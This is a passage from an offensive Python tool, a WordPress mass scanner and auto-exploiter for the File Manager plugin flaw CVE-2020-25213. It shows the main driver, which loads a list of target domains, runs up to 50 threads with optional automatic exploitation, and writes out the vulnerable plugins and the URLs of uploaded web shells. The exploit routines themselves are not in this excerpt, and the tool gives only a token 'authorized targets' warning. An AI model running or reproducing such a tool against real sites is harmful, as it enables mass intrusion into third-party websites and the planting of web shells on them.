                        f.write(f"Vulnerable Plugins: {len(result['vulnerable_plugins'])}\n")
                        
                        for plugin in result['vulnerable_plugins']:
                            f.write(f"  - {plugin['plugin']}: {plugin['url']}\n")
                        
                        if result['shell_urls']:
                            f.write("\nUPLOADED SHELLS:\n")
                            for shell in result['shell_urls']:
                                f.write(f"  → {shell}\n")
                        
                        f.write("\n" + "=" * 100 + "\n\n")
            
    except Exception as e:
        print(f"{RED}[!]{RESET} Error saving results: {e}")

def main():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

    banner = f"""
{RED}
██╗    ██╗██████╗     ███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗
██║    ██║██╔══██╗    ██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝
██║ █╗ ██║██████╔╝    █████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   
██║███╗██║██╔═══╝     ██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   
╚███╔███╔╝██║         ███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   
 ╚══╝╚══╝ ╚═╝         ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   
                                                                            
                   FILE MANAGER EXPLOIT SCANNER + CVE-2020-25213
{RESET}
"""
    
    print(banner)
    
    filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
    
    if not os.path.exists(filename):
        print(f"{RED}[!]{RESET} File not found: {filename}")
        return
    
    print(f"{BLUE}[*]{RESET} Loading targets...")
    targets = load_targets(filename)
    
    if not targets:
        print(f"{RED}[!]{RESET} No targets loaded")
        return
    
    print(f"{GREEN}[+]{RESET} Loaded {CYAN}{len(targets)}{RESET} targets")
    
    threads_input = input(f"{YELLOW}[?]{RESET} Threads [{CYAN}30{RESET}]: ").strip()
    max_workers = int(threads_input) if threads_input.isdigit() else 30
    max_workers = min(max_workers, 50)
    
    exploit_input = input(f"{YELLOW}[?]{RESET} Enable auto exploit? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
    exploit = exploit_input == 'y'
    
    print(f"{BLUE}[*]{RESET} Starting scan with {CYAN}{max_workers}{RESET} threads...")
    if exploit:
        print(f"{RED}[!]{RESET} AUTO EXPLOIT ENABLED (CVE-2020-25213 + others)")
        print(f"{YELLOW}[!]{RESET} Use only on authorized targets")
    print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop")
    
    try:
        results = mass_scan_targets(targets, max_workers, exploit)
        
        if results:
            save_option = input(f"\n{YELLOW}[?]{RESET} Save results? ({GREEN}y{RESET}/{RED}n{RESET}): ").strip().lower()
            if save_option == 'y':
                save_filename = input(f"{YELLOW}[?]{RESET} Filename [{CYAN}wp_exploit_results.txt{RESET}]: ").strip()
                if not save_filename:
                    save_filename = "wp_exploit_results.txt"
                save_results(results, save_filename)
                print(f"{GREEN}[+]{RESET} Results saved to {CYAN}{save_filename}{RESET}")
        else:
            print(f"{BLUE}[i]{RESET} No WordPress sites found")
    
    except KeyboardInterrupt:
        print(f"\n{RED}[!]{RESET} Scan interrupted")
    except Exception as e:
        print(f"{RED}[!]{RESET} Scan error: {e}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Exiting...{RESET}")
    except Exception as e:
        print(f"{RED}Fatal error: {e}{RESET}")
